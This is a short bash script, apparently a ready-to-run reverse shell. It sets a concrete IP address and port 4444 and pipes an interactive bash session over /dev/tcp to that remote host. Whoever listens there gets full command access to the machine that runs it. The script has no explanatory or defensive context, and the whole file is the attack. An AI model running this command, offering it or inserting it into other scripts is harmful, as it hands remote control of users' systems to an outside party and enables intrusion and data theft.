#!/bin/bash


IP="101.34.76.208"
PORT="4444"


bash -i >& /dev/tcp/$IP/$PORT 0>&1
